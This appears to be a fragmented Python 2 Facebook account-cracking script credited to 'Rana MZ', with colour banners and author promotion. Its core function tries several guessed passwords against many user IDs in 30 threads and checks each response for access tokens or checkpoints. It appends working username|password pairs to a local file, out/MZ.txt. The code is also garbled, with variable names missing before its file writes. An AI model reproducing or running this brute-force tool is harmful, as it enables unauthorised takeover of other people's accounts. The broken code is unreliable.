#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Rana MZ 
#Nam tu suna huga ...
#Reserved2021
...
=  ====  ==  ====  ==  =======  ==  ====  =======  =====  ==        =
=====================================================================
    \033[1;94m::   _   _   _     _   _     _   _   _   _     _   _   _   _  
  / \ / \ / \   / \ / \   / \ / \ / \ / \   / \ / \ / \ / \ 
...
os.system("clear")
print  """
\033[1;94mAuthor\033[1;91m: \033[1;91mRana MZ
\033[1;94mFacebook\033[1;91m: \033[1;91mRana MZ
\033[1;94mYouTube\033[1;91m: \033[1;91mRana MZ
\033[1;95m\033[1;96mRana mz \033[1;95m
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.youtube.com/channel/UCd98cgcWQyHYWcnDAS9CedA')
    else:
...
def login():
	...
	try:
		...
		print "\033[1;95m\033[1;92m Rana MZ\033[1;95m"
		print('	   \033[1;94m\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK' )
		print('	' )
		...
		if 'save-device' in url:
			try:
				...
				keluar()
		if 'MZ' in url:
			print("\n\x1b[1;92mYour Account is on MZ")
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;91mYour Account is on MZ"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
	...
	print "\033[1;95m\033[1;96mRana mz\033[1;95m"
...
def pilih_super():
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["open_msg"]:
					print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
					 = open("out/MZ.txt", "a")
					.write(user+"|"+pass1+"\n")
					.close()
					.append(user+pass1)
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["open_msg"]:
							print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
							 = open("out/MZ.txt", "a")
							.write(user+"|"+pass2+"\n")
							close()
							.append(user+pass2)
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["open_msg"]:
									print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
									 = open("out/MZ.txt", "a")
									.write(user+"|"+pass3+"\n")
									.close()
									.append(user+pass3)
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["open_msg"]:
											print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
											 = open("out/MZ.txt", "a")
											.write(user+"|"+pass4+"\n")
											.close()
											.append(user+pass4)
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["open_msg"]:
													print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
													 = open("out/MZ.txt", "a")
													.write(user+"|"+pass5+"\n")
													.close()
													.append(user+pass5)
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["open_msg"]:
															print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
															 = open("out/MZ.txt", "a")
															.write(user+"|"+pass6+"\n")
															.close()
															.append(user+pass6)
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["open_msg"]:
																	print '\x1b[1;95mMZ\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																	 = open("out/MZ.txt", "a")
																	.write(user+"|"+pass7+"\n")
																	.close()
																	.append(user+pass7)
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96m Rana MZ\033[1;95m"
	print "  \033[1;93m«---•◈•---Developed By Rana MZ»" #Dev:RANA MZ
 ...
 ( R ) a ) n ) a ) ( M ) Z )
  \_/ \_/ \_/ \_/   \_/ \_/ 
: \033[1;96m NAM TU SUNA HUGA  \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                Facebok
               Rana MZ"""
